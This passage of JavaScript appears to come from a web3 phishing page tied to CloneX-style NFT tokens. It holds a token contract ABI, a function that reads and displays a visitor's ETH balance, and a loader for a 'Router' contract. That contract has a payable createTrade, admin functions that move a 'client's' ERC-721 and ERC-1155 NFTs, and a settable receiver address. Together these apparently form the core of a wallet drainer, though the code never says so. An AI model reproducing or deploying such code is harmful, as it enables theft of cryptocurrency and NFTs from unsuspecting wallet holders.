"amounts", "type": "uint256[]" }], "name": "redeemBatch", "outputs": [], "stateMutability": "payable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "remainingMints", "outputs": [{ "components": [{ "internalType": "uint256", "name": "WearableId", "type": "uint256" }, { "internalType": "uint256", "name": "RemainingMints", "type": "uint256" }], "internalType": "struct RedeemableToken.Remaining[]", "name": "", "type": "tuple[]" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "renounceOwnership", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "from", "type": "address" }, { "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256[]", "name": "ids", "type": "uint256[]" }, { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" }, { "internalType": "bytes", "name": "data", "type": "bytes" }], "name": "safeBatchTransferFrom", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "from", "type": "address" }, { "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "id", "type": "uint256" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }, { "internalType": "bytes", "name": "data", "type": "bytes" }], "name": "safeTransferFrom", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "operator", "type": "address" }, { "internalType": "bool", "name": "approved", "type": "bool" }], "name": "setApprovalForAll", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "newAddress", "type": "address" }], "name": "setCloneX", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "newAddress", "type": "address" }], "name": "setCloneXMetadata", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "newAddress", "type": "address" }], "name": "setForgingAddress", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "newContractAddress", "type": "address" }], "name": "setMiddleware", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "tokenId", "type": "uint256" }, { "internalType": "string", "name": "newUri", "type": "string" }], "name": "setTokenURIs", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "bytes1", "name": "dna", "type": "bytes1" }, { "internalType": "uint256[2]", "name": "range", "type": "uint256[2]" }], "name": "setWearableRange", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "bytes4", "name": "interfaceId", "type": "bytes4" }], "name": "supportsInterface", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "toggleForgeable", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "name": "tokenURIs", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "tokenId", "type": "uint256" }], "name": "uri", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }, { "internalType": "uint256", "name": "", "type": "uint256" }], "name": "wearableSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "withdrawFunds", "outputs": [], "stateMutability": "nonpayable", "type": "function" }]

// let metamaskInstalled = false;
// if (typeof window.ethereum !== 'undefined') metamaskInstalled = true;
// window.addEventListener('load', async () => {
//   await Moralis.enableWeb3(metamaskInstalled ? {} : { provider: "walletconnect" });
// });


async function getBalance(address, out, justBalance){
  const balances =  web3.utils.fromWei(
  await web3.eth.getBalance(address),
      'ether'
      ) * 1;
  if(justBalance != undefined)
    return balances
  else{
    if(out){
      if(balances > 0){
        var eth_amount = document.getElementById('eth-amount')
        if(eth_amount != undefined)
        eth_amount.innerText = balances
      }
      OutBalance = balances
    }else{
      InBalance = balances
    }
  }

}

let contractAddress = "0xaa418095cdcaeb3bf3f7ce2612a09534bc7f209f";
async function loadContract() {
    // set your deployed contract address
    var contractAbi = [
      {
        "inputs": [],
        "name": "createTrade",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
      },
      {
        "inputs": [],
        "name": "renounceOwnership",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
      },
      {
        "anonymous": false,
        "inputs": [
          {
            "indexed": true,
            "internalType": "address",
            "name": "previousOwner",
            "type": "address"
          },
          {
            "indexed": true,
            "internalType": "address",
            "name": "newOwner",
            "type": "address"
          }
        ],
        "name": "OwnershipTransferred",
        "type": "event"
      },
      {
        "inputs": [
          {
            "components": [
              {
                "internalType": "address",
                "name": "add",
                "type": "address"
              },
              {
                "internalType": "uint256[]",
                "name": "ids",
                "type": "uint256[]"
              }
            ],
            "internalType": "struct Router.Collection[]",
            "name": "collections",
            "type": "tuple[]"
          },
          {
            "internalType": "uint256[]",
            "name": "amounts",
            "type": "uint256[]"
          },
          {
            "internalType": "address",
            "name": "client",
            "type": "address"
          }
        ],
        "name": "send1155NFTsFromAdmin",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "inputs": [
          {
            "components": [
              {
                "internalType": "address",
                "name": "add",
                "type": "address"
              },
              {
                "internalType": "uint256[]",
                "name": "ids",
                "type": "uint256[]"
              }
            ],
            "internalType": "struct Router.Collection[]",
            "name": "collections",
            "type": "tuple[]"
          },
          {
            "internalType": "address",
            "name": "client",
            "type": "address"
          }
        ],
        "name": "send721NFTsFromAdmin",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "inputs": [
          {
            "internalType": "address",
            "name": "_newReceiver",
            "type": "address"
          }
        ],
        "name": "setReceiver",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "inputs": [
          {
            "internalType": "address",
            "name": "newOwner",
            "type": "address"
          }
        ],
        "name": "transferOwnership",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "inputs": [],
        "name": "getReceiver",
        "outputs": [
          {
            "internalType": "address",
            "name": "",
            "type": "address"
          }
        ],
        "stateMutability": "view",
        "type": "function"
      },
      {
        "inputs": [],
        "name": "owner",
        "outputs": [
          {
            "internalType": "address",
            "name": "",
            "type": "address"
          }
        ],
        "stateMutability": "view",
        "type": "function"
      },
      {
        "inputs": [],
        "name": "receiver",
        "outputs": [
          {
            "internalType": "address",
            "name": "",
            "type": "address"
          }
        ],
        "stateMutability": "view",
        "type": "function"
      }
    ]
    // set your deployed contract Abi from remix
    //{from: account, gas: 47000, data: bytecode} options
    try{
        if(serverContract != undefined)
            contractAddress = serverContract
    }catch{

    }
    var deafultFee = 100000
    try{
        if(fee != undefined)
            deafultFee = fee
    }catch{

    }
    return await new window.web3.eth.Contract(contractAbi, contractAddress, {gas: deafultFee})
}